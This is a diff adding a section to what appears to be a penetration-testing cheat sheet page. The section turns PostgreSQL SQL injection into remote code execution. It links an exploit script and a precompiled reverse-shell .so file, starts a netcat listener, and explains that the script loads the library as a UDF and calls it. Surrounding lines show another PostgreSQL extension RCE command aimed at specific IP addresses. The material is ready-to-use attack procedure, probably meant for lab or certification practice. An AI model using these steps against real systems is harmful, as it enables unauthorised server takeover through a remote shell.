@@ -225,6 +225,14 @@ nc -lnvp 4444
 python2 postgresql_extension_rce_with_large_object.py 192.168.192.113:8443 192.168.45.181 4444
 </code></pre></div></div>
 <hr>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### UDF RCE using SO file:
+SQLi > Copy request as Python to <a href="https://atdane.github.io/cheatsheet/lib/SQLi2RCE_PostgreSQL.py.txt">SQLi2RCE_PostgreSQL.py</a> > Download <a href="https://atdane.github.io/cheatsheet/lib/pg_rev_shell.so">pg_rev_shell.so</a> (for Linux target - Windows target might need to call other APIs) to the same folder
+sudo nc -lnvp 443
+python3 SQLi2RCE_PostgreSQL.py
+
+# The script above will write the SO file into PostgreSQL UDF -> then call the function.
+</code></pre></div></div>
+<hr>
 <h2 id="ssti-to-rce">SSTI to RCE</h2>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Detect:
